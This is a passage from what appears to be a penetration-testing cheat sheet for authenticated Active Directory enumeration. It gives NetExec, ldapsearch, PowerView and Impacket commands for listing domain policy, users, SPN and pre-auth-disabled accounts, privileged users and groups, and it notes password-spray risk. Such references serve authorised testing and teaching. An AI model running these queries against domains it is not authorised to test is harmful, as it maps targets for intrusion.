+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>With NTLM hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>With Kerberos:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_HOST</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-k
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_HOST</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-k
+</span></code></pre></div>
+<p><strong>Basic domain information</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--get-sid
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--dc-list
+</span></code></pre></div>
+<p>LDAP RootDSE:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span>+
+</span></code></pre></div>
+<p>Useful RootDSE fields:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>defaultNamingContext<span class="w"> </span>rootDomainNamingContext<span class="w"> </span>configurationNamingContext<span class="w"> </span>schemaNamingContext<span class="w"> </span>dnsHostName<span class="w"> </span>ldapServiceName
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">Get-Domain</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">Get-DomainController</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nb">Get-DomainPolicyData</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nb">Get-DomainSID</span>
+</span></code></pre></div>
+<p>Active Directory PowerShell module:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">Get-ADDomain</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">Get-ADForest</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nb">Get-ADDomainController</span> <span class="n">-Filter</span> <span class="p">*</span>
+</span></code></pre></div>
+<p><strong>Password policy</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--pass-pol
+</span></code></pre></div>
+<p>PowerView:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">Get-DomainPolicyData</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">SystemAccess</span>
+</span></code></pre></div>
+<p>AD module:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">Get-ADDefaultDomainPasswordPolicy</span>
+</span></code></pre></div>
+<p>Look for:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Domain name</td>
+<td>Needed for tools and Kerberos realm.</td>
+</tr>
+<tr>
+<td>NetBIOS name</td>
+<td>Needed for SMB/RPC style authentication.</td>
+</tr>
+<tr>
+<td>Domain SID</td>
+<td>Useful for SID/RID interpretation.</td>
+</tr>
+<tr>
+<td>DC list</td>
+<td>Identifies all domain controllers.</td>
+</tr>
+<tr>
+<td>Password policy</td>
+<td>Important before any password testing.</td>
+</tr>
+<tr>
+<td>Lockout threshold</td>
+<td>Determines spray risk.</td>
+</tr>
+<tr>
+<td>MachineAccountQuota</td>
+<td>Shows whether normal users can create machine accounts.</td>
+</tr>
+<tr>
+<td>Forest name</td>
+<td>Important in multi-domain environments.</td>
+</tr>
+<tr>
+<td>Functional level</td>
+<td>Gives context about AD feature set.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="users">Users</h2>
+<p>User enumeration identifies domain accounts, naming patterns, descriptions, account flags, password metadata, SPNs, admin-related attributes, and possible service accounts.</p>
+<p><strong>NetExec</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--users
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--active-users
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--users-export<span class="w"> </span>users.txt
+</span></code></pre></div>
+<p>User descriptions:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>get-desc-users
+</span></code></pre></div>
+<p><strong>LDAP</strong></p>
+<p>All users:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>sAMAccountName<span class="w"> </span>userPrincipalName<span class="w"> </span>description<span class="w"> </span>memberOf<span class="w"> </span>pwdLastSet<span class="w"> </span>lastLogonTimestamp<span class="w"> </span>userAccountControl<span class="w"> </span>servicePrincipalName
+</span></code></pre></div>
+<p>Only enabled users:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>sAMAccountName<span class="w"> </span>userPrincipalName
+</span></code></pre></div>
+<p>Users with descriptions:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(description=*))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>sAMAccountName<span class="w"> </span>description
+</span></code></pre></div>
+<p>Users with SPNs:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>sAMAccountName<span class="w"> </span>servicePrincipalName
+</span></code></pre></div>
+<p>Users with Kerberos pre-auth disabled:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>sAMAccountName<span class="w"> </span>userPrincipalName
+</span></code></pre></div>
+<p>Password never expires:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>sAMAccountName<span class="w"> </span>userPrincipalName
+</span></code></pre></div>
+<p>AdminCount users:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=person)(objectClass=user)(adminCount=1))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>sAMAccountName<span class="w"> </span>memberOf
+</span></code></pre></div>
+<p><strong>Impacket</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>GetADUsers.py<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-all
+</span></code></pre></div>
+<p><strong>PowerView</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="nb">Get-DomainUser</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="n">alice</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="nb">Get-DomainUser</span> <span class="n">-AdminCount</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="nb">Get-DomainUser</span> <span class="n">-UACFilter</span> <span class="n">DONT_REQ_PREAUTH</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="nb">Get-DomainUser</span> <span class="n">-UACFilter</span> <span class="n">PASSWD_NOTREQD</span>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="nb">Get-DomainUser</span> <span class="n">-UACFilter</span> <span class="n">DONT_EXPIRE_PASSWORD</span>
+</span></code></pre></div>
+<p>Useful formatting:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nb">Get-DomainUser</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">description</span><span class="p">,</span><span class="n">lastlogontimestamp</span><span class="p">,</span><span class="n">pwdlastset</span><span class="p">,</span><span class="n">memberof</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span>
+</span></code></pre></div>
+<p><strong>Interesting user fields</strong></p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sAMAccountName</code></td>
+<td>Username for most tools.</td>
+</tr>
+<tr>
+<td><code>userPrincipalName</code></td>
+<td>UPN logon format.</td>
+</tr>
+<tr>
+<td><code>description</code></td>
+<td>Sometimes contains role hints or secrets in labs.</td>
+</tr>
+<tr>
+<td><code>memberOf</code></td>
+<td>Group membership.</td>
+</tr>
+<tr>
+<td><code>servicePrincipalName</code></td>
+<td>Service account indicator.</td>
+</tr>
+<tr>
+<td><code>pwdLastSet</code></td>
+<td>Password age.</td>
+</tr>
+<tr>
+<td><code>lastLogonTimestamp</code></td>
+<td>Approximate activity.</td>
+</tr>
+<tr>
+<td><code>userAccountControl</code></td>
+<td>Account behavior flags.</td>
+</tr>
+<tr>
+<td><code>adminCount</code></td>
+<td>Possible protected/privileged history.</td>
+</tr>
+<tr>
+<td><code>badPwdCount</code></td>
+<td>Bad password count.</td>
+</tr>
+<tr>
+<td><code>logonCount</code></td>
+<td>Activity clue.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>User list cleanup</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>cat<span class="w"> </span>users.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">&#39;[:upper:]&#39;</span><span class="w"> </span><span class="s1">&#39;[:lower:]&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span>&gt;<span class="w"> </span>users_clean.txt
+</span></code></pre></div>
+<p>Extract usernames from LDAP output:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;sAMAccountName:&quot;</span><span class="w"> </span>ldap_users.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span>&gt;<span class="w"> </span>users.txt
+</span></code></pre></div>
+<hr />
+<h2 id="groups">Groups</h2>
+<p>Group enumeration maps privilege structure.</p>
+<p>Groups are important because users often gain access through direct or nested membership rather than direct permissions.</p>
+<p><strong>NetExec</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--groups
+</span></code></pre></div>
+<p>Members of a specific group:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--groups<span class="w"> </span><span class="s2">&quot;Domain Admins&quot;</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--groups<span class="w"> </span><span class="s2">&quot;Enterprise Admins&quot;</span>
+</span></code></pre></div>
+<p><strong>LDAP</strong></p>
+<p>All groups:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=group)&quot;</span><span class="w"> </span>cn<span class="w"> </span>distinguishedName<span class="w"> </span>member<span class="w"> </span>description<span class="w"> </span>groupType
+</span></code></pre></div>
+<p>Specific group:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=group)(cn=Domain Admins))&quot;</span><span class="w"> </span>cn<span class="w"> </span>member
+</span></code></pre></div>
